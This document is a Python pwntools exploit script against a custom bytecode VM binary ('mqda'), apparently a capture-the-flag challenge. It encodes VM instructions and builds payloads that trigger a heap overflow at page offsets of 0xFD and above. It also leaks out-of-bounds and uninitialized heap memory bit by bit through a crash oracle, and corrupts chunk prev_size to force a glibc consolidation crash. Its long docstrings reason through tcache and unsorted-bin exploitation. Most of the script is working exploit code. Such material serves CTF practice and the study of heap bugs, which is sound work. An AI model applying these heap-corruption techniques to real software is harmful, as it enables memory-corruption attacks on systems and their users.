#!/usr/bin/env python3
"""
MQDA VM Exploit
Exploits heap overflow in PUSH/STORE when offset & 0xFF >= 0xFD
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# ============= INSTRUCTION ENCODERS =============

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm):
    return bytes([0x41, reg]) + p32(imm)

def store_mem_reg(addr_reg, val_reg):
    return bytes([0x61, addr_reg, val_reg])

def load_reg_mem(dst_reg, addr_reg):
    return bytes([0x81, dst_reg, addr_reg])

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def add_reg_imm(reg, imm):
    return bytes([0x44, reg]) + p32(imm)

def sub_reg_imm(reg, imm):
    return bytes([0x45, reg]) + p32(imm)

def and_reg_imm(reg, imm):
    return bytes([0x49, reg]) + p32(imm)

def shr_reg_imm(reg, imm):
    return bytes([0x4c, reg]) + p32(imm)

def cmp_reg_imm(reg, imm):
    return bytes([0x4d, reg]) + p32(imm)

def jmp_reg(reg):
    return bytes([0x0e, reg])

def jne_reg(reg):
    return bytes([0x0f, reg])

def je_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xff])

# ============= EXPLOIT CODE =============

def debug_heap_layout():
    """
    Debug the heap layout to understand what comes after pages.
    
    Heap layout after main starts:
    1. vm_state = calloc(0x50, 1) -> chunk size 0x60
    2. init_vm allocates code pages and page tables
    
    We want to find what's after a page in memory.
    """
    code = b''
    
    # Set SP to address with offset 0xFF
    # This will trigger allocation of that page
    code += mov_reg_imm(15, 0x123400FF)
    
    # PUSH - this overflows 3 bytes past the page
    # The value we push will have 3 bytes written OOB
    code += mov_reg_imm(0, 0x41424344)
    code += push_reg(0)
    
    # Now let's try POP from the overflow region to see what's there
    code += mov_reg_imm(15, 0x123400FF)
    code += pop_reg(1)  # r1 = 4 bytes from OOB region (3 bytes past page end)
    
    # r1 contains heap metadata from next chunk
    # Let's use conditional jumps to leak it bit by bit
    
    code += hlt()
    
    return code


def leak_bit(bit_position, sp_addr=0x123400FF):
    """
    Leak one bit of the OOB heap data after a page.
    """
    code = b''
    
    # Set SP to trigger page allocation and read OOB
    code += mov_reg_imm(15, sp_addr)
    code += pop_reg(0)  # r0 = OOB data
    
    # Test specific bit
    if bit_position > 0:
        code += shr_reg_imm(0, bit_position)
    code += and_reg_imm(0, 1)
    code += cmp_reg_imm(0, 1)
    
    code += mov_reg_imm(1, 0x60)  # Jump target for bit=1
    code += je_reg(1)
    
    code += hlt()  # Bit = 0
    
    # Pad to 0x60
    while len(code) < 0x60:
        code += bytes([0x00])
    code += trigger_illegal()  # Bit = 1
    
    return code


def leak_from_address(addr, binary='./mqda'):
    """Leak 32 bits from a VM address by reading uninitialized page."""
    leaked = 0
    
    for bit in range(32):
        code = b''
        code += mov_reg_imm(0, addr)
        code += load_reg_mem(1, 0)  # r1 = [addr] (uninitialized)
        
        if bit > 0:
            code += shr_reg_imm(1, bit)
        code += and_reg_imm(1, 1)
        code += cmp_reg_imm(1, 1)
        
        code += mov_reg_imm(2, 0x60)
        code += je_reg(2)
        code += hlt()
        
        while len(code) < 0x60:
            code += bytes([0x00])
        code += trigger_illegal()
        
        try:
            p = process(binary, level='error')
            p.sendlineafter(b'Code Address> ', b'0')
            p.sendlineafter(b'Code Length> ', str(len(code)).encode())
            p.sendafter(b'Code> ', code)
            p.sendlineafter(b'Entry IP> ', b'0')
            
            output = p.recvall(timeout=2)
            p.close()
            
            if b'ILLEGAL' in output:
                leaked |= (1 << bit)
        except:
            pass
    
    return leaked


def leak_from_address_fast(addr, binary='./mqda'):
    """
    Faster leak using byte-by-byte approach.
    8 connections per byte instead of 8 per bit.
    Still slow but faster than bit-by-bit for 32 bits.
    """
    # For now, just use the bit approach but only for first 8 bits
    leaked = 0
    
    for bit in range(8):
        code = b''
        code += mov_reg_imm(0, addr)
        code += load_reg_mem(1, 0)
        
        if bit > 0:
            code += shr_reg_imm(1, bit)
        code += and_reg_imm(1, 1)
        code += cmp_reg_imm(1, 1)
        
        code += mov_reg_imm(2, 0x60)
        code += je_reg(2)
        code += hlt()
        
        while len(code) < 0x60:
            code += bytes([0x00])
        code += trigger_illegal()
        
        try:
            p = process(binary, level='error')
            p.sendlineafter(b'Code Address> ', b'0')
            p.sendlineafter(b'Code Length> ', str(len(code)).encode())
            p.sendafter(b'Code> ', code)
            p.sendlineafter(b'Entry IP> ', b'0')
            
            output = p.recvall(timeout=2)
            p.close()
            
            if b'ILLEGAL' in output:
                leaked |= (1 << bit)
        except:
            pass
    
    return leaked


def test_entry_ip_oob():
    """
    Test what happens if Entry IP points beyond our code.
    
    If we load code at address 0 with length N,
    and set Entry IP to address N+k,
    the VM will try to execute uninitialized data!
    """
    code = b''
    
    # Minimal code - just some NOPs then halt
    code += hlt()
    
    return code, 0, 0x100  # code, code_addr, entry_ip


def test_wild_jump():
    """
    Use JMP to transfer control to uninitialized memory.
    """
    code = b''
    
    # Set up a jump to uninitialized address
    code += mov_reg_imm(0, 0x12340000)  # r0 = high address
    code += jmp_reg(0)                   # Jump there
    
    # If we get here, something went wrong
    code += hlt()
    
    return code


def test_libc_leak():
    """
    Try to leak libc address by reading unsorted bin fd.
    
    Plan:
    1. Allocate 8 pages (page0-page7) - first 7 fill tcache when freed
    2. Make pages 0-7 all zeros (will be freed during cleanup)
    3. Trigger cleanup - pages freed, page7 goes to unsorted bin
    4. BUT cleanup returns and program exits...
    
    We need to READ the freed chunk AFTER it's freed but BEFORE exit.
    That's impossible with current cleanup flow.
    
    Alternative: Can we arrange for a DIFFERENT chunk to be freed first?
    The global page array is scanned in order. First entry freed first.
    
    If we:
    1. Allocate page0 (non-zero, won't be freed)
    2. Allocate pages 1-8 (all zeros, will be freed)
    3. During cleanup: pages 1-8 freed, page8 in unsorted bin
    4. But page0 is not freed, so we can't read through page0...
    
    Hmm, the issue is that OOB read goes into the NEXT chunk's metadata.
    If page0 is kept, page1 is freed. page0's OOB reads page1's metadata.
    After page1 is freed to tcache, its fd is a heap pointer or NULL.
    After page7 is freed to unsorted bin, its fd is libc pointer!
    
    But we can't read DURING cleanup - VM has already stopped by then.
    
    Wait - what if we allocate pages in a specific ORDER so that:
    - Page X (kept, has our OOB code) is adjacent to Page Y
    - Page Y is one of the pages that goes to unsorted bin
    
    Pages in the page array at 0x50c0 are in allocation order.
    Cleanup scans array in order (index 0 to 255).
    
    If we allocate:
    page[0] at 0x11000000 (will keep - non-zero data)
    page[1] at 0x11000100 (will free - all zeros) -> tcache
    page[2] at 0x11000200 (will free) -> tcache
    ...
    page[7] at 0x11000700 (will free) -> tcache (7th, fills it)
    page[8] at 0x11000800 (will free) -> unsorted bin!
    
    For OOB read, we need page[0] adjacent to page[8] in HEAP, not in array.
    But they're allocated sequentially, so heap order is same as allocation order.
    
    page[0] is at lowest heap address, page[8] at highest.
    page[0]'s OOB reads into page[1]'s metadata, not page[8]'s.
    
    To read page[8]'s metadata, we need a page right before page[8] in heap.
    That's page[7].
    
    But page[7] is also being freed! And it goes to tcache, so after free
    its fd is either NULL or a tcache pointer.
    
    The unsorted bin chunk (page[8]) has libc pointer in fd.
    But page[7] (the page before it in heap) is also freed.
    We can't do OOB read from page[7] after it's freed.
    
    Unless we DON'T free page[7]!
    
    Plan v2:
    1. Allocate pages 0-6 (all zeros) -> tcache when freed
    2. Allocate page7 (NON-zero, won't be freed)
    3. Allocate page8 (all zeros) -> unsorted bin when freed (tcache full!)
    
    Wait, tcache holds 7 entries. If 7 pages freed, tcache is full.
    8th page freed goes to unsorted bin (or fastbin if small enough).
    
    But I'm allocating page7 as non-zero, so only 7 pages (0-6 and 8) are freed.
    Pages 0-6 go to tcache (7 entries), page8 goes to unsorted bin? 
    No wait, 7 tcache entries are 0-6. Page 8 is the 8th free, goes to unsorted bin!
    Perfect!
    
    But heap order is: page0, page1, ..., page7, page8
    page7 (non-zero) is between page6 and page8.
    page7's OOB reads page8's metadata!
    After page8 is freed to unsorted bin, page8's fd = libc pointer!
    
    But the order of frees during cleanup is:
    - Scan array index 0 to 255
    - Free pages with all-zero data
    
    Array order = allocation order = heap order (in this case).
    So frees happen: page0, page1, ..., page6, (skip page7), page8.
    
    When we do OOB read from page7, page8 hasn't been freed yet!
    OOB read happens during VM execution, frees happen after during cleanup.
    
    We need OOB read to happen AFTER frees. But VM execution is BEFORE cleanup.
    
    This seems impossible with the current program flow...
    
    Unless we find a way to read UNINITIALIZED heap data that already contains
    libc pointers from a previous allocation!
    
    If we're lucky, the heap memory for page8 might contain leftover libc pointers
    from previous program runs (unlikely) or from libc's internal allocations.
    
    Libc does allocate internal buffers that might leave pointers. Let me try!
    """
    code = b''
    
    # Allocate a page at a high address
    # The malloc for this page might get memory that has leftover libc pointers
    code += mov_reg_imm(0, 0x11000000)
    code += load_reg_mem(1, 0)  # Read uninitialized page data
    
    # r1 now contains whatever garbage was in heap
    # Use conditional jumps to exfiltrate bits
    
    # For simplicity, just do many reads and hope some have libc pointers
    # We'd need to actually leak bit by bit using timing or exit codes
    
    code += hlt()
    
    return code


def test_consolidation_crash():
    """
    Need to trigger actual consolidation to exploit prev_size corruption.
    
    Tcache holds 7 entries per bin. Fastbin is for small chunks (<=0x80).
    Our chunks are 0x110, so no fastbin.
    
    Free order:
    1-7: Go to tcache (7 entries)
    8: Goes to unsorted bin, sets PREV_INUSE=0 on chunk 9
    9: If freed, will try to consolidate with 8 using prev_size!
    
    But we need chunk 9 freed AFTER chunk 8. The cleanup frees in array order.
    Array order = allocation order.
    
    If we allocate pages 0-9 and make all zeros:
    - Page 0 freed: tcache (entry 1)
    - Page 1 freed: tcache (entry 2)
    - ...
    - Page 6 freed: tcache (entry 7, full)
    - Page 7 freed: unsorted bin! Sets page8's PREV_INUSE=0
    - Page 8 freed: tries to consolidate with page7! Uses prev_size!
    
    So we need to corrupt page8's prev_size, not page9's!
    
    Overflow from page 7 into page 8's prev_size:
    - Page 7 is at 0x11000700
    - Set SP to 0x110007FF
    - Push with low byte 0 to keep page 7 all-zeros
    """
    code = b''
    
    # Allocate 9 pages (0-8), all zeros
    for i in range(9):
        addr = 0x11000000 + (i << 8)
        code += mov_reg_imm(0, addr)
        code += mov_reg_imm(1, 0x00000000)
        code += store_mem_reg(0, 1)
    
    # Overflow from page 7 into page 8's prev_size
    code += mov_reg_imm(15, 0x110007FF)  # SP at page 7, offset 0xFF
    code += mov_reg_imm(0, 0xDEADBE00)  # Low byte 0 to keep page 7 freeable
    code += push_reg(0)
    
    # Cleanup will free pages in order:
    # Pages 0-6: tcache (7 entries)
    # Page 7: unsorted bin, sets page 8's PREV_INUSE=0
    # Page 8: tries to consolidate using corrupted prev_size -> CRASH!
    
    code += hlt()
    
    return code


def main():
    binary = './mqda'
    
    print("[*] Testing consolidation crash...")
    code = test_consolidation_crash()
    print(f"[*] Code length: {len(code)}")
    
    p = process(binary)
    p.sendlineafter(b'Code Address> ', b'0')
    p.sendlineafter(b'Code Length> ', str(len(code)).encode())
    p.sendafter(b'Code> ', code)
    p.sendlineafter(b'Entry IP> ', b'0')
    
    try:
        output = p.recvall(timeout=3)
        print(f"[*] Output: {output}")
    except:
        print("[*] Timeout or crash")
    
    ret = p.poll()
    print(f"[*] Return code: {ret}")
    
    if ret == -11:
        print("[+] SEGFAULT! Consolidation crashed!")
    elif ret == -6:
        print("[+] SIGABRT! Heap corruption detected!")
    elif ret == 0:
        print("[*] Normal exit")
    
    p.close()


if __name__ == '__main__':
    main()
